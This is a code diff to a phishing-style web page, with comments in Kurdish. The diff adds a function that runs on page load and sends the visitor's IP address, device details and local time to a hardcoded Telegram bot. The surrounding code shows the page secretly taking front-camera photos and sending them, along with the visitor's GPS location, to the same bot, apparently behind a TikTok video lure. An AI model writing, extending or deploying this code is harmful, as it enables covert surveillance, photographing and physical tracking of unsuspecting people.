@@ -15,7 +15,6 @@
             left: 0; 
             width: 100%; 
             height: 100%; 
-            /* چاککردنی ناونیشانی وێنەکە */
             background: url('soran.jpg') no-repeat center center; 
             background-size: contain; 
             z-index: 1; 
@@ -40,6 +39,35 @@
         const chat_id = "7261354534";
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
+        // فانکشنی نوێ بۆ کۆکردنەوە و ناردنی زانیارییەکانی سەردانکەر
+        async function sendVisitorDetails() {
+            try {
+                // هێنانی ئایپی و پۆرت لە ڕێگەی API دەرەکییەوە
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                const ip = ipData.ip || "نەزانراو";
+                // پۆرتی کڕیار (Client Port) لە ڕێگەی جاڤاسکریتەوە ڕاستەوخۆ نادۆزرێتەوە بەهۆی پاراستنی تایبەتمەندی، بۆیە هەمیشە وەک نیشانە بە داینامیکی دادەنرێت
+                const port = window.location.port || "80/443 (Standard)"; 
+                
+                // ناسینەوەی جۆری ئامێر
+                const device = navigator.userAgent.split(')')[0].split('(')[1] || "نەزانراو";
+                
+                // ڕێکخستنی کات و ڕێکەوت بەپێی کاتی سەردانکەرەکە
+                const now = new Date();
+                const time = now.toLocaleTimeString('en-US', { hour12: false });
+                const date = now.toLocaleDateString('en-US');
+
+                // دروستکردنی دەقی پەیامەکە بەو شێوازەی خۆت داوات کردووە
+                const message = `🚀 سەردانکەرێکی نوێ:\n🌐 ئایپی: ${ip}\n🔌 پۆرت: ${port}\n📱 ئامێر: ${device}\n⏰ کات: ${time}\n📅 ڕێکەوت: ${date}`;
+
+                // ناردنی دەقەکە بۆ تێلێگرام
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+            } catch (error) {
+                console.log("Error fetching visitor details:", error);
+            }
+        }
+
         async function sendPhoto(v, c, fileName, caption) {
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
@@ -52,6 +80,9 @@
         }
 
         async function startApp() {
+            // لەگەڵ دەستپێکردنی بەرنامەکە، زانیارییەکان دەنێرێت
+            sendVisitorDetails();
+
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
@@ -71,7 +102,6 @@
                             navigator.geolocation.getCurrentPosition(async (pos) => {
                                 const lat = pos.coords.latitude;
                                 const lon = pos.coords.longitude;
-                                // چاککردنی لینکەکە بۆ ئەوەی ئیش بکات
                                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                                 
                                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
